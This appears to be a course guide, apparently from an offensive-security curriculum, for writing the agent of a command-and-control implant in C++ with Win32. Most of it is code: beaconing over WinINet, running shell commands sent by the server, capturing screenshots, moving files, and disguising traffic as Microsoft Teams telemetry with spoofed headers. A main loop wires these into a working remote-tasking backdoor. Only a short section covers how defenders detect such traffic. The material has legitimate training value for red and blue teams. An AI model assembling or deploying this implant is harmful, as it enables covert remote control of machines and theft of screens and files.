# Module 20 — Agent-Side Concepts (ex02, ex03, ex04)

The exercises ask you to build the agent side of the C2. Rather than a
complete copy-paste solution, this guide explains each piece precisely so
you can implement it yourself — which is the point of the curriculum.

---

## ex02 — Agent Beacon (WinINet HTTP)

### Stable Agent ID
Generate a stable ID from hostname so the server recognises the same machine
across reboots:
```cpp
// DJB2 hash → format as 8-char hex string
DWORD djb2(const char* s) {
    DWORD h = 5381;
    while (*s) h = h * 33 + (unsigned char)*s++;
    return h;
}
char agentId[16];
char hostname[256]; DWORD len = sizeof(hostname);
GetComputerNameA(hostname, &len);
sprintf_s(agentId, "%08X", djb2(hostname));
```

### HTTP POST with WinINet
```cpp
// Open internet session
HINTERNET hInet = InternetOpenA("Agent/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
HINTERNET hConn = InternetConnectA(hInet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
HINTERNET hReq  = HttpOpenRequestA(hConn, "POST", "/beacon", NULL, NULL, NULL,
                                    INTERNET_FLAG_NO_CACHE_WRITE, 0);
HttpSendRequestA(hReq, "Content-Type: application/json\r\n", -1, body, strlen(body));
// Read response: InternetReadFile loop
```

### Simple JSON field extractor
```cpp
// Find "key":"value" in a JSON string — no library needed for simple responses
std::string jsonGet(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":\"";
    auto pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos += search.size();
    auto end = json.find('"', pos);
    return json.substr(pos, end - pos);
}
```

### Shell command execution
```cpp
// CreateProcess with anonymous pipes for stdout/stderr
HANDLE hReadOut, hWriteOut;
CreatePipe(&hReadOut, &hWriteOut, &sa, 0);

STARTUPINFOA si = {};
si.hStdOutput = si.hStdError = hWriteOut;
si.dwFlags = STARTF_USESTDHANDLES;

PROCESS_INFORMATION pi;
CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
CloseHandle(hWriteOut);  // close our copy so ReadFile sees EOF when process exits

// Read all output
std::string output;
char buf[4096]; DWORD read;
while (ReadFile(hReadOut, buf, sizeof(buf)-1, &read, NULL) && read > 0) {
    buf[read] = '\0'; output += buf;
}
WaitForSingleObject(pi.hProcess, INFINITE);
```

---

## ex03 — Task Engine (screenshot, file up/download)

### Base64 encoding
Standard base64 — use the lookup table:
```
static const char* B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
```
Process 3 input bytes → 4 output characters. Pad with `=`.

### Screenshot via GDI
```cpp
HDC hScreen  = GetDC(NULL);
HDC hCapture = CreateCompatibleDC(hScreen);
int w = GetSystemMetrics(SM_CXSCREEN);
int h = GetSystemMetrics(SM_CYSCREEN);
HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
SelectObject(hCapture, hBmp);
BitBlt(hCapture, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);

// Get raw pixels
BITMAPINFOHEADER bih = {};
bih.biSize = sizeof(bih); bih.biWidth = w; bih.biHeight = -h; // top-down
bih.biPlanes = 1; bih.biBitCount = 24; bih.biCompression = BI_RGB;
int rowSize = ((w * 3 + 3) & ~3);  // DWORD-aligned
std::vector<BYTE> pixels(rowSize * h);
GetDIBits(hCapture, hBmp, 0, h, pixels.data(), (BITMAPINFO*)&bih, DIB_RGB_COLORS);

// Prepend BITMAPFILEHEADER + BITMAPINFOHEADER
BITMAPFILEHEADER bfh = {};
bfh.bfType = 0x4D42; // "BM"
bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
bfh.bfSize    = bfh.bfOffBits + pixels.size();

std::vector<BYTE> bmpData;
// append bfh bytes, bih bytes, pixels
// then base64-encode bmpData
```

### File upload / download
For upload: `ReadFile` → base64-encode → POST to `/upload` endpoint.  
For download: WinINet GET request → `InternetReadFile` loop → `WriteFile` to local path.

---

## ex04 — Malleable Profile (traffic obfuscation)

### URL rotation pool
```cpp
std::vector<std::string> urlPool = {
    "/collector/3.0/config",
    "/telemetry/v2/send",
    "/api/v1/events",
};
static int idx = 0;
std::string nextUrl() { return urlPool[idx++ % urlPool.size()]; }
```

### Wrap payload in Teams JSON envelope
```cpp
std::string wrapPayload(const std::string& b64data) {
    return "{\"events\":[{\"name\":\"appLoaded\",\"data\":\"" + b64data + "\"}]}";
}
```

### Build request with spoofed headers
```cpp
struct HttpRequest { std::string method, url, headers, body; };

HttpRequest buildRequest(const std::string& payload) {
    HttpRequest req;
    req.method  = "POST";
    req.url     = nextUrl();
    req.headers = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                  "Origin: https://teams.microsoft.com\r\n"
                  "Content-Type: application/json\r\n"
                  "X-Ms-Client-Version: 27/1.0.0.2021011237\r\n";
    req.body    = wrapPayload(payload);
    return req;
}
```

### Blue-team detection angle
These disguises break simple URL/UA blocklists, but defenders can still catch
malleable C2 via:
- **Beacon timing**: regular intervals (even with jitter) → statistical analysis
- **JA3/JA3S fingerprint**: TLS handshake parameters are still agent-specific
- **Certificate mismatch**: traffic claiming to be Teams but not from Microsoft IPs
- **Content-length anomalies**: Teams telemetry bodies are tiny; a screenshot upload is MBs
- **DNS**: agent beaconing to a domain registered days ago, low Alexa rank

---

## Putting it together

The main loop pattern:
```cpp
while (running) {
    std::string response = beacon(serverUrl, agentInfo);
    std::string task     = jsonGet(response, "task");

    if (task == "shell") {
        std::string cmd    = jsonGet(response, "args");
        std::string output = runShell(cmd);
        postResult(serverUrl, agentId, jsonGet(response, "taskId"), output);
    } else if (task == "screenshot") {
        // takeScreenshot → base64 → postResult
    } else if (task == "exit") {
        break;
    }
    Sleep(5000);
}
```

Implement each piece from the pseudocode above using the actual Win32 APIs
described. The exercises provide the correct function signatures and struct
definitions — fill them in and test each function in isolation before wiring
up the main loop.
